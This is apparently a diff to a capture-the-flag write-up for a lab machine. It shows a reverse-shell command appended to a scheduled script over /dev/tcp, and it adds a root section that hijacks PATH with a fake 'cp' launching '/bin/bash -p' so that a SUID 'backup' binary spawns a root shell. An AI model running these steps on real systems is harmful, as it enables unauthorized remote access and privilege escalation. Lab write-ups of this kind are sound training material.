@@ -91,5 +91,17 @@ So we then run **echo "bash -i >& /dev/tcp/ip/1235 0>&1" >> /opt/helloworld.sh**
 
 Then run another listener and wait for a minute. Coffee break.
 
+# ROOT
+
+Moving into the secret directory we can see a file called backup. Running does not do much so we are going to do something crazy. 
+So type:
+ 1. **echo '/bin/bash -p' > cp**
+ 2. **chmod 777 cp**
+ 3. **export PATH=/home/archangel/secret:$PATH**
+ 4. **echo $PATH**
+ 5. **./backup**
+
+Okay let us dig into what jus happened.
+
 
 
